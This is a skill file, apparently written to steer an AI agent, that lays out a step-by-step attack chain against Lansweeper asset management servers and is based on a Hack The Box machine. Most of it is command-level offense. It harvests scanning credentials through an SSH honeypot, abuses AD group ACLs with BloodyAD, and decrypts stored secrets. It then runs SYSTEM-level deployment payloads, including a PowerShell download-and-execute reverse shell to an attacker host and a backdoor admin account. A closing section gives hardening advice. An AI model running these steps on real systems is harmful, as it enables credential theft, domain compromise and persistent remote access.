---
name: lansweeper-assessment
description: Security assessment skill for Lansweeper IT asset management platforms. Use this skill whenever the user needs to assess Lansweeper deployments, harvest scanning credentials, decrypt stored secrets, abuse AD ACLs related to Lansweeper groups, or execute deployment-based RCE. Trigger on mentions of Lansweeper, IT asset discovery, scanning credentials, web.config decryption, deployment packages, or any Lansweeper-related attack surface during penetration testing or red team engagements.
---

# Lansweeper Security Assessment

A comprehensive skill for assessing Lansweeper IT asset discovery and inventory platforms during security engagements. This skill covers credential harvesting, secret decryption, AD ACL abuse, and deployment-based code execution.

## When to Use This Skill

Use this skill when:
- Assessing Lansweeper deployments in Active Directory environments
- Attempting to harvest scanning credentials from Lansweeper
- Decrypting stored secrets from Lansweeper web.config
- Exploiting AD ACLs related to Lansweeper service accounts
- Executing code via Lansweeper Deployment packages
- Hardening Lansweeper installations against these attack vectors

## Prerequisites

- Network access to Lansweeper server or managed endpoints
- Compromised credentials with appropriate permissions
- Tools: NetExec, BloodHound, BloodyAD, sshesame, SharpLansweeperDecrypt
- For decryption: Local access to Lansweeper server
- For deployment RCE: Membership in "Lansweeper Admins" group

---

## 1. Harvest Scanning Credentials via Honeypot

### Concept
Lansweeper scanning engines authenticate to assets using configured credentials. By creating a Scanning Target pointing to an attacker-controlled host, you can capture these credentials when the scanner attempts to authenticate.

### Setup SSH Honeypot

```bash
# Install sshesame (Linux)
sudo apt install -y sshesame

# Create configuration
cat > sshesame.conf << 'EOF'
server:
  listen_address: <YOUR_IP>:2022
EOF

# Start honeypot
sshesame --config sshesame.conf
```

### Configure Lansweeper Target

1. Navigate to **Scanning → Scanning Targets → Add Scanning Target**
2. Set Type to **IP Range** or **Single IP** pointing to your honeypot
3. Configure SSH port (e.g., 2022 if 22 is blocked)
4. Map existing Linux/SSH scanning credentials to the target
5. Click **Scan now** to trigger immediately

### Expected Output

```text
authentication for user "svc_inventory_lnx" with password "<password>" accepted
connection with client version "SSH-2.0-RebexSSH_5.0.x" established
```

### Validate Captured Credentials

```bash
# Test against domain controller services
netexec smb <DC> -u <captured_user> -p '<captured_password>'
netexec ldap <DC> -u <captured_user> -p '<captured_password>'
netexec winrm <DC> -u <captured_user> -p '<captured_password>'
```

**Note:** Works similarly for SMB/WinRM honeypots. SSH is typically simplest due to cleartext credential capture.

---

## 2. AD ACL Abuse via Lansweeper Groups

### Enumerate Effective Rights

Use BloodHound to identify ACL paths from compromised accounts to privileged groups.

```bash
# NetExec collection (LDAP)
netexec ldap <DC> -u <user> -p '<password>' --bloodhound -c All --dns-server <DC_IP>

# RustHound-CE collection (produces zip for BH CE import)
rusthound-ce --domain <domain> -u <user> -p '<password>' -c All --zip
```

### Exploit GenericAll on Groups

Common pattern: Scanner group (e.g., "Lansweeper Discovery") has GenericAll over privileged group (e.g., "Lansweeper Admins").

```bash
# Add user to target group using BloodyAD
bloodyAD --host <DC> -d <domain> -u <user> -p '<password>' \
  add groupMember "Lansweeper Admins" <your_user>

# Verify WinRM access
netexec winrm <DC> -u <your_user> -p '<password>'
```

### Obtain Interactive Shell

```bash
evil-winrm -i <target> -u <user> -p '<password>'
```

### Handle Kerberos Time Skew

If you encounter `KRB_AP_ERR_SKEW`, sync to the domain controller:

```bash
sudo ntpdate <dc-fqdn-or-ip>
# Alternative
rdate -n <dc-ip>
```

---

## 3. Decrypt Lansweeper Secrets on Host

### Locate Encrypted Configuration

```text
Web config: C:\Program Files (x86)\Lansweeper\Website\web.config
Application key: C:\Program Files (x86)\Lansweeper\Key\Encryption.txt
```

The web.config contains encrypted connection strings using ASP.NET DataProtectionConfigurationProvider.

### Decrypt Using SharpLansweeperDecrypt

```powershell
# Upload and execute decryption script
Upload-File .\LansweeperDecrypt.ps1 C:\ProgramData\LansweeperDecrypt.ps1
powershell -ExecutionPolicy Bypass -File C:\ProgramData\LansweeperDecrypt.ps1
```

### Expected Output

```text
Inventory Windows  SWEEP\svc_inventory_win  <StrongPassword!>
Inventory Linux    svc_inventory_lnx        <StrongPassword!>
```

### Leverage Recovered Credentials

```bash
# Windows scanning credentials often have local admin rights
netexec winrm <target> -u svc_inventory_win -p '<StrongPassword!>'
```

---

## 4. Deployment Package RCE (SYSTEM)

### Concept
As a member of "Lansweeper Admins", you can create deployment packages that execute arbitrary commands on targeted assets. The Lansweeper service runs with high privileges, yielding NT AUTHORITY\SYSTEM execution.

### Create Deployment Package

1. Navigate to **Deployment → Deployment packages**
2. Create new package with PowerShell or cmd payload
3. Target desired asset (DC, server, workstation)
4. Click **Deploy/Run now**

### Example Payloads

```powershell
# Verification command
powershell -nop -w hidden -c "whoami > C:\Windows\Temp\ls_whoami.txt"

# Reverse shell (adapt to your listener)
powershell -nop -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('http://<attacker>/rs.ps1')"

# Add persistent user
net user <username> <password> /add
net localgroup administrators <username> /add
```

### OPSEC Considerations

- Deployment actions are **noisy** and logged in:
  - Lansweeper audit logs
  - Windows Event Logs (Security, System, PowerShell)
- Use judiciously and consider detection implications
- Package creation/modification is auditable

---

## Detection and Hardening Recommendations

### Network Monitoring
- Restrict anonymous SMB enumerations
- Monitor for RID cycling and anomalous Lansweeper share access
- Block/restrict outbound SSH/SMB/WinRM from scanner hosts
- Alert on non-standard ports (e.g., 2022) and unusual client banners (Rebex)

### File Protection
- Protect `Website\web.config` and `Key\Encryption.txt`
- Externalize secrets to vault (Azure Key Vault, HashiCorp Vault)
- Rotate credentials on exposure
- Use gMSA where viable

### Active Directory Monitoring
- Alert on changes to Lansweeper-related groups:
  - "Lansweeper Admins"
  - "Lansweeper Discovery"
  - "Remote Management Users"
- Monitor ACL changes granting GenericAll/Write membership on privileged groups

### Deployment Auditing
- Audit deployment package creation/changes/executions
- Alert on packages spawning cmd.exe/powershell.exe
- Monitor for unexpected outbound connections from deployment actions

---

## Related Techniques

- SMB/LSA/SAMR enumeration and RID cycling
- Kerberos password spraying and clock skew considerations
- BloodHound path analysis of application-admin groups
- WinRM lateral movement

## References

- [HTB: Sweep — Abusing Lansweeper Scanning, AD ACLs, and Secrets](https://0xdf.gitlab.io/2025/08/14/htb-sweep.html)
- [sshesame (SSH honeypot)](https://github.com/jaksi/sshesame)
- [SharpLansweeperDecrypt](https://github.com/Yeeb1/SharpLansweeperDecrypt)
- [BloodyAD](https://github.com/CravateRouge/bloodyAD)
- [BloodHound CE](https://github.com/SpecterOps/BloodHound)
